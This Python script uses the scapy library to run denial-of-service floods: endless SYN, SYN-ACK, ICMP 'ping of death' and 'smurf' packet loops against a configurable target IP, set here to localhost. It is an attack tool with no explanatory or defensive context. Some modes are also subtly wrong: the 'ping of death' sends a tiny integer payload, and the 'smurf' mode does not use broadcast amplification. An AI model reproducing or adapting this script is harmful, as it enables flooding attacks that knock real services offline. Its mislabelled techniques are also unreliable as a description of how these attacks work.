from scapy.all import *
import ipaddress

def ddos (target_ip, type) :
    target_port = 12345
    if type == "syn_flood":
        while(True):
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
    if type == "pod":
        while(True):
            load = 6000
            pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
            send(pkt, verbose=0)
    if type == "syn_ack":
        while(True):
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
            send(pkt, verbose=0)
    if type == "smurf":
        while(True):
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()
            send(pkt, verbose=0)

# Variables
target_ip = "127.0.0.1"
type = 'syn_ack'                  # syn_flood     pod     syn_ack     smurf

ddos(target_ip,type)
